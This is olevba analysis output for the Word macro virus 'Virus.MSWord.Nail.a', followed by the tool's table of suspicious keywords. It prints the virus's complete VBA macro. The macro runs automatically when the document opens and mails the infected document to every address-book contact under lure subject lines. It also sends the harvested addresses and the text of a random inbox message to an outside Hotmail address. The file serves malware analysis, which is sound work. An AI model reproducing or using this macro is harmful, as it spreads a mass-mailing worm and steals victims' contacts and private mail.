olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Nail.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Nail.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'<!--1nternal-->
'Automated Chain Mail v0.1
Private Sub Document_Open()
    Randomize
    SubjectLines = Array("Good Times", "New Developments", "WWIII !", "Market share tipoff...")
    ContentLines = Array("New information on this apparent hoax...", "I thought you should know about this recent development...", "Check out CNN.Com or read this", "Please don't share this information with anyone")
    MesNum = Int(Rnd * 4)
    CRLF = Chr(13) + Chr(10)
    Set MAPISess = CreateObject("MAPI.Session")
    MAPISess.Logon
        MesContent = CRLF + ContentLines(MesNum) + CRLF + CRLF + MAPISess.CurrentUser
        Set ChainMes = MAPISess.Outbox.Messages.Add(SubjectLines(MesNum), MesContent)
        Set objRecipients = ChainMes.Recipients
        For Each AdrEntry In MAPISess.AddressLists(1).AddressEntries
            Set Recp = objRecipients.Add(Name:=AdrEntry.Address, Type:=3)
            GInfo = GInfo + AdrEntry.Address + ";"
        Next
        Set objAttach = ChainMes.Attachments.Add
        objAttach.Type = 1
        objAttach.Source = ActiveDocument.FullName
        objAttach.Position = 0
        objAttach.Name = MAPISess.CurrentUser
        GInfo = GInfo + CRLF + CRLF + MAPISess.Inbox.Messages(Int(Rnd * MAPISess.Inbox.Messages.Count) + 1).Text + CRLF
        GInfo = GInfo + "Thank you for your participation... 1nternal"
        Set Retr = MAPISess.Outbox.Messages.Add(MAPISess.CurrentUser, GInfo)
        Set Recp = Retr.Recipients.Add(Name:="chainnail@hotmail.com")
        Retr.Send
        ChainMes.Send
    MAPISess.Logoff
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|CurrentUser         |May detect Norman Sandbox                    |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

